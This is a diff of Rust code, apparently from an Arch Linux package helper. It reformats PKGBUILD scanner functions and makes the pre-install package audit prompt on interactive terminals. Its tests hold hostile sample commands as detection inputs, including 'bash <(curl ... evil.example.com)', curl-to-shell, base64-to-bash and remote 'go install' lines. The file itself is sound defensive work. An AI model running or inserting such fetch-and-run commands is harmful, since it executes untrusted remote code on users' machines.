@@ -335,8 +335,20 @@ pub(crate) fn interp_process_subst_line(line: &str) -> bool {
     let basename = first.rsplit('/').next().unwrap_or(first);
     matches!(
         basename,
-        "sh" | "bash" | "zsh" | "ksh" | "dash" | "source" | "." | "perl" | "ruby" | "irb"
-            | "node" | "nodejs" | "deno" | "php" | "Rscript"
+        "sh" | "bash"
+            | "zsh"
+            | "ksh"
+            | "dash"
+            | "source"
+            | "."
+            | "perl"
+            | "ruby"
+            | "irb"
+            | "node"
+            | "nodejs"
+            | "deno"
+            | "php"
+            | "Rscript"
     ) || basename.starts_with("python")
         || basename.starts_with("pypy")
         || basename.starts_with("lua")
@@ -366,8 +378,21 @@ fn pipes_into_interpreter(lower_line: &str) -> bool {
     let basename = first.rsplit('/').next().unwrap_or(first);
     matches!(
         basename,
-        "sh" | "bash" | "zsh" | "ksh" | "dash" | "source" | "." | "perl" | "ruby" | "irb"
-            | "node" | "nodejs" | "deno" | "bun" | "php" | "Rscript"
+        "sh" | "bash"
+            | "zsh"
+            | "ksh"
+            | "dash"
+            | "source"
+            | "."
+            | "perl"
+            | "ruby"
+            | "irb"
+            | "node"
+            | "nodejs"
+            | "deno"
+            | "bun"
+            | "php"
+            | "Rscript"
     ) || basename.starts_with("python")
         || basename.starts_with("pypy")
         || basename.starts_with("lua")
@@ -1104,7 +1129,13 @@ pub(crate) fn foreign_pkg_manager_install_line(line: &str) -> bool {
 /// `--root "$pkgdir"/usr` or `-ldflags "-s -w"` argument would be
 /// mistaken for the package name (and the real one after it missed).
 const CARGO_VALUE_TAKING_FLAGS: &[&str] = &[
-    "--root", "--index", "--registry", "--target", "--path", "-j", "--jobs",
+    "--root",
+    "--index",
+    "--registry",
+    "--target",
+    "--path",
+    "-j",
+    "--jobs",
 ];
 // Tokens arrive pre-lowercased (the line is lowercased first), so the
 // entries must be lowercase too: a `-C` entry can never match, its
@@ -1168,7 +1199,10 @@ pub(crate) fn is_foreign_pkg_manager_install(source: &str) -> bool {
 }
 
 pub(crate) fn line_of_toolchain_install(source: &str) -> Option<usize> {
-    source.lines().position(toolchain_install_line).map(|i| i + 1)
+    source
+        .lines()
+        .position(toolchain_install_line)
+        .map(|i| i + 1)
 }
 
 pub(crate) fn line_of_foreign_pkg_manager_install(source: &str) -> Option<usize> {
@@ -3044,11 +3078,7 @@ fn normalize_pkg_path(p: &str) -> String {
             }
         }
     }
-    if out.is_empty() {
-        "/".to_string()
-    } else {
-        out
-    }
+    if out.is_empty() { "/".to_string() } else { out }
 }
 
 /// Run `bsdtar` and return stdout lines; stderr goes into the error.
@@ -3159,13 +3189,15 @@ fn extract_install_script(path: &std::path::Path) -> Option<String> {
     String::from_utf8(out.stdout).ok()
 }
 
-/// Audit every built tarball before `-U`. Prints findings; when
-/// `force_prompt` is true (interactive ask paths) requires `y` to
-/// continue. With `--noconfirm` only warns and continues.
+/// Audit every built tarball before `-U`. Prints findings; on a TTY
+/// always requires `y` to continue (even without `--ask`). Only a
+/// non-interactive run (no TTY, or explicit non-ask batch path with
+/// `force_prompt == false` and no terminal) warns and continues — the
+/// previous default that skipped the prompt whenever `--ask` was off.
 ///
 /// Returns `false` if the user declined.
 pub(crate) fn audit_built_packages(tarballs: &[String], force_prompt: bool) -> bool {
-    use std::io::{self, Write};
+    use std::io::{self, IsTerminal, Write};
     use std::path::Path;
 
     if tarballs.is_empty() {
@@ -3223,9 +3255,13 @@ pub(crate) fn audit_built_packages(tarballs: &[String], force_prompt: bool) -> b
     if !any {
         return true;
     }
-    if !force_prompt {
+    // Default: prompt on a TTY even without --ask. Non-interactive
+    // (no TTY) keeps the old warn-and-continue behaviour unless the
+    // caller forced a prompt.
+    let interactive = force_prompt || io::stdin().is_terminal();
+    if !interactive {
         eprintln!(
-            "{} sensitive paths/scripts detected in the built package(s); install continues (--noconfirm). Review the list above.",
+            "{} sensitive paths/scripts detected in the built package(s); install continues (non-interactive). Review the list above.",
             ">>> Warning:".t_yellow().bold()
         );
         return true;
@@ -3277,9 +3313,9 @@ mod scanner_tests {
     #[test]
     fn normalized_pkg_path_still_matches_dangerous_list() {
         let normalized = normalize_pkg_path("usr//share/libalpm/hooks/evil.hook");
-        assert!(DANGEROUS_PKG_PATH_SUBSTR
-            .iter()
-            .any(|sub| normalized.contains(sub) || normalized.starts_with(sub.trim_end_matches('/'))));
+        assert!(DANGEROUS_PKG_PATH_SUBSTR.iter().any(
+            |sub| normalized.contains(sub) || normalized.starts_with(sub.trim_end_matches('/'))
+        ));
         // Spaces inside a member name survive now that names come from
         // `bsdtar -tf` instead of the unquoted verbose listing.
         let spaced = normalize_pkg_path("usr/share/libalpm/hooks/spaced name.hook");
@@ -3314,9 +3350,15 @@ mod scanner_tests {
 
     #[test]
     fn interp_process_subst_caught_and_data_tools_clean() {
-        assert!(interp_process_subst_line("bash <(curl -sL https://evil.example.com/x)"));
-        assert!(interp_process_subst_line("sh -c 'echo hi' <(wget -qO- http://x/y)"));
-        assert!(interp_process_subst_line("sudo bash <(curl -s https://x/y)"));
+        assert!(interp_process_subst_line(
+            "bash <(curl -sL https://evil.example.com/x)"
+        ));
+        assert!(interp_process_subst_line(
+            "sh -c 'echo hi' <(wget -qO- http://x/y)"
+        ));
+        assert!(interp_process_subst_line(
+            "sudo bash <(curl -s https://x/y)"
+        ));
         assert!(interp_process_subst_line("/bin/zsh <(curl -s https://x/y)"));
         assert!(interp_process_subst_line("python3 <(curl -s https://x/y)"));
         // source <( stays on its own dedicated check, but this catches it too.
@@ -3330,7 +3372,9 @@ mod scanner_tests {
         assert!(!interp_process_subst_line("bash <(cat local.sh)"));
         assert!(!interp_process_subst_line("# bash <(curl ...) comment"));
         // echo writing its arguments is not an execution.
-        assert!(!interp_process_subst_line("echo bash <(curl -s https://x/y)"));
+        assert!(!interp_process_subst_line(
+            "echo bash <(curl -s https://x/y)"
+        ));
     }
 
     #[test]
@@ -3366,15 +3410,23 @@ mod scanner_tests {
         assert!(decompress_pipe_shell_line("unzstd -c payload.zst | sh"));
         assert!(decompress_pipe_shell_line("unzip -p payload.zip | sh"));
         assert!(decompress_pipe_shell_line("tar -xOzf pkg.tar.gz | bash"));
-        assert!(decompress_pipe_shell_line("tar -x -O -z -f pkg.tar.gz | bash"));
-        assert!(decompress_pipe_shell_line("bsdtar -xOf pkg.tar usr/bin/x | sh"));
-        assert!(decompress_pipe_shell_line("sudo tar --to-stdout -xf pkg.tar | sh"));
+        assert!(decompress_pipe_shell_line(
+            "tar -x -O -z -f pkg.tar.gz | bash"
+        ));
+        assert!(decompress_pipe_shell_line(
+            "bsdtar -xOf pkg.tar usr/bin/x | sh"
+        ));
+        assert!(decompress_pipe_shell_line(
+            "sudo tar --to-stdout -xf pkg.tar | sh"
+        ));
         assert!(decompress_pipe_shell_line("cat a.tbz | gtar -xOj | bash"));
         assert!(decompress_pipe_shell_line("xz -dc blob.xz | python3"));
         assert!(decompress_pipe_shell_line("openssl enc -d -in p.enc | sh"));
         // Decompression without a shell/interpreter on the end is a normal
         // file operation.
-        assert!(!decompress_pipe_shell_line("gunzip -c payload.gz > payload.txt"));
+        assert!(!decompress_pipe_shell_line(
+            "gunzip -c payload.gz > payload.txt"
+        ));
         assert!(!decompress_pipe_shell_line("zcat changelog.gz | head -20"));
         assert!(!decompress_pipe_shell_line("tar -xzf pkg.tar.gz"));
         // tar flags are case-sensitive: lowercase -o in extract mode is
@@ -3428,18 +3480,28 @@ mod scanner_tests {
         // Remote crates/modules: flagged.
         assert!(toolchain_install_line("cargo install evil-cli"));
         assert!(toolchain_install_line("cargo install --locked evil-cli"));
-        assert!(toolchain_install_line("cargo install --root \"$pkgdir\"/usr evil-cli"));
-        assert!(toolchain_install_line("go install github.com/evil/tool@latest"));
-        assert!(toolchain_install_line("go install github.com/evil/tool@v1.0.0"));
+        assert!(toolchain_install_line(
+            "cargo install --root \"$pkgdir\"/usr evil-cli"
+        ));
+        assert!(toolchain_install_line(
+            "go install github.com/evil/tool@latest"
+        ));
+        assert!(toolchain_install_line(
+            "go install github.com/evil/tool@v1.0.0"
+        ));
         // Local targets: the normal packaging flow.
         assert!(!toolchain_install_line("cargo install --path ."));
         assert!(!toolchain_install_line("cargo install --path \"$pkgdir\""));
         assert!(!toolchain_install_line("go install -v ./..."));
         // -C is value-taking (matched lowercased): the value must not be
         // mistaken for the package name hiding the remote module behind it.
-        assert!(toolchain_install_line("go install -C sub github.com/evil/t@latest"));
+        assert!(toolchain_install_line(
+            "go install -C sub github.com/evil/t@latest"
+        ));
         assert!(!toolchain_install_line("go install -C sub ./cmd/tool"));
-        assert!(!toolchain_install_line("go install -ldflags '-s -w' ./cmd/foo"));
+        assert!(!toolchain_install_line(
+            "go install -ldflags '-s -w' ./cmd/foo"
+        ));
         assert!(!toolchain_install_line("go install ./cmd/tool"));
         // Ambiguous short go name may be in-module: stay quiet.
         assert!(!toolchain_install_line("go install tool"));
@@ -3488,7 +3550,9 @@ mod scanner_tests {
                    go install github.com/evil/t@latest\n}\n";
         let findings = scan_pkgbuild_source(src);
         assert!(
-            findings.iter().any(|f| f.message.contains("process substitution")),
+            findings
+                .iter()
+                .any(|f| f.message.contains("process substitution")),
             "bash <(curl) missing: {findings:?}"
         );
         assert!(
@@ -4068,8 +4132,14 @@ package() {
             Some("evil.install".to_string())
         );
         // A later empty assignment empties the variable: no hook at all.
-        assert_eq!(parse_install_filename("install=legit.install\ninstall="), None);
-        assert_eq!(parse_install_filename("install=legit.install\ninstall=''"), None);
+        assert_eq!(
+            parse_install_filename("install=legit.install\ninstall="),
+            None
+        );
+        assert_eq!(
+            parse_install_filename("install=legit.install\ninstall=''"),
+            None
+        );
         // The empty-first shape still resolves to the later one.
         assert_eq!(
             parse_install_filename("install=\ninstall=real.install"),
@@ -4108,13 +4178,19 @@ package() {
         assert!(decompress_pipe_shell_line(
             "unzip -p payload.zip | sh        # decompress | shell in the hook"
         ));
-        assert!(base64_pipe_shell_line("echo x | base64 -d | bash # data | grep"));
-        assert!(curl_pipe_shell_line("curl -sSL https://x | sh # save | log"));
+        assert!(base64_pipe_shell_line(
+            "echo x | base64 -d | bash # data | grep"
+        ));
+        assert!(curl_pipe_shell_line(
+            "curl -sSL https://x | sh # save | log"
+        ));
         // ...and a comment that merely SAYS `| sh` must not fake one.
         assert!(!curl_pipe_shell_line(
             "curl -sSL https://x -o f # pipe it to | sh later"
         ));
-        assert!(!decompress_pipe_shell_line("gunzip -c payload.gz > out # | sh"));
+        assert!(!decompress_pipe_shell_line(
+            "gunzip -c payload.gz > out # | sh"
+        ));
         // '#' mid-word (a URL fragment) is not a comment.
         assert!(curl_pipe_shell_line("curl -sSL https://x#a | sh"));
         // A '#' inside quotes stays inside the command.
